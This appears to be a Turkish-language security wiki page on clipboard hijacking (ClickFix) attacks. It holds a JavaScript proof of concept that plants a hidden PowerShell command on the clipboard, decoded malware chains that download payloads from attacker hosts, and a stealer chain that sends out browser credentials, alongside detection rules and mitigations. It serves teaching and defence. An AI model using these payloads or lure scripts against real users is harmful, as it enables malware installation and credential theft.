# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Kendiniz kopyalamadığınız hiçbir şeyi yapıştırmayın." – eski ama hala geçerli bir tavsiye

## Overview

Clipboard hijacking – ayrıca *pastejacking* olarak da bilinir – kullanıcıların komutları incelemeden kopyalayıp yapıştırma alışkanlığından faydalanır. Kötü niyetli bir web sayfası (veya Electron veya masaüstü uygulaması gibi herhangi bir JavaScript uyumlu bağlam) programatik olarak saldırgan kontrolündeki metni sistem panosuna yerleştirir. Kurbanlar, genellikle dikkatlice hazırlanmış sosyal mühendislik talimatlarıyla, **Win + R** (Çalıştır penceresi), **Win + X** (Hızlı Erişim / PowerShell) tuşlarına basmaları veya bir terminal açıp *panodaki* içeriği yapıştırmaları için teşvik edilir, bu da rastgele komutların hemen yürütülmesine neden olur.

**Hiçbir dosya indirilmediği ve hiçbir ek açılmadığı için**, bu teknik, ekleri, makroları veya doğrudan komut yürütmeyi izleyen çoğu e-posta ve web içeriği güvenlik kontrolünü atlatır. Bu nedenle, saldırı, NetSupport RAT, Latrodectus yükleyici veya Lumma Stealer gibi ticari kötü amaçlı yazılım ailelerini dağıtan phishing kampanyalarında popülerdir.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Eski kampanyalar `document.execCommand('copy')` kullanıyordu, yenileri ise asenkron **Clipboard API** (`navigator.clipboard.writeText`) kullanıyor.

## ClickFix / ClearFake Akışı

1. Kullanıcı bir yazım hatası yapılmış veya ele geçirilmiş bir siteyi ziyaret eder (örneğin `docusign.sa[.]com`)
2. Enjekte edilmiş **ClearFake** JavaScript, sessizce bir Base64 kodlu PowerShell tek satırlık komutunu panoya kaydeden `unsecuredCopyToClipboard()` yardımcı fonksiyonunu çağırır.
3. HTML talimatları kurbanı şunları yapmaya yönlendirir: *“**Win + R** tuşlarına basın, komutu yapıştırın ve sorunu çözmek için Enter'a basın.”*
4. `powershell.exe` çalıştırılır, meşru bir yürütülebilir dosya ile birlikte kötü niyetli bir DLL içeren bir arşiv indirir (klasik DLL yan yükleme).
5. Yükleyici ek aşamaları şifre çözer, shellcode enjekte eder ve kalıcılığı kurar (örneğin, planlanmış görev) – nihayetinde NetSupport RAT / Latrodectus / Lumma Stealer'ı çalıştırır.

### Örnek NetSupport RAT Zinciri
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (meşru Java WebStart) dizininde `msvcp140.dll` arar.
* Kötü niyetli DLL, **GetProcAddress** ile API'leri dinamik olarak çözer, **curl.exe** aracılığıyla iki ikili dosya (`data_3.bin`, `data_4.bin`) indirir, bunları `"https://google.com/"` anahtarını kullanarak şifrelerini çözer, son shellcode'u enjekte eder ve **client32.exe** (NetSupport RAT) dosyasını `C:\ProgramData\SecurityCheck_v1\` dizinine çıkarır.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. `la.txt` dosyasını **curl.exe** ile indirir
2. **cscript.exe** içinde JScript indiricisini çalıştırır
3. Bir MSI yüklemesi alır → imzalı bir uygulamanın yanına `libcef.dll` bırakır → DLL yan yükleme → shellcode → Latrodectus.

### Lumma Stealer MSHTA aracılığıyla
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** çağrısı, `PartyContinued.exe`'yi alıp, `Boat.pst`'yi (CAB) çıkartarak, `AutoIt3.exe`'yi `extrac32` ve dosya birleştirmesi ile yeniden yapılandıran ve sonunda tarayıcı kimlik bilgilerini `sumeriavgv.digital`'a dışarı aktaran bir gizli PowerShell betiği başlatır.

## Tespit ve Avlanma

Mavi takımlar, yapıştırma istismarı tespit etmek için pano, işlem oluşturma ve kayıt defteri telemetrisini birleştirebilir:

* Windows Kayıt Defteri: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`, **Win + R** komutlarının bir geçmişini tutar – alışılmadık Base64 / obfuscate edilmiş girişler arayın.
* Güvenlik Olay ID **4688** (İşlem Oluşturma) burada `ParentImage` == `explorer.exe` ve `NewProcessName` { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } içinde.
* Olay ID **4663**, şüpheli 4688 olayından hemen önce `%LocalAppData%\Microsoft\Windows\WinX\` veya geçici klasörler altında dosya oluşturma için.
* EDR pano sensörleri (varsa) – `Clipboard Write` ile hemen ardından yeni bir PowerShell işlemi arasında ilişki kurun.

## Hafifletmeler

1. Tarayıcı güçlendirme – pano yazma erişimini devre dışı bırakın (`dom.events.asyncClipboard.clipboardItem` vb.) veya kullanıcı jesti gerektirin.
2. Güvenlik farkındalığı – kullanıcılara hassas komutları *yazmayı* veya önce bir metin düzenleyicisine yapıştırmayı öğretin.
3. PowerShell Kısıtlı Dil Modu / İcra Politikası + Uygulama Kontrolü, keyfi tek satırlık komutları engellemek için.
4. Ağ kontrolleri – bilinen yapıştırma istismarı ve kötü amaçlı yazılım C2 alanlarına giden istekleri engelleyin.

## İlgili Hileler

* **Discord Davet İstismarı**, kullanıcıları kötü niyetli bir sunucuya çekmenin ardından genellikle aynı ClickFix yaklaşımını istismar eder:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Referanslar

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)

{{#include ../../banners/hacktricks-training.md}}
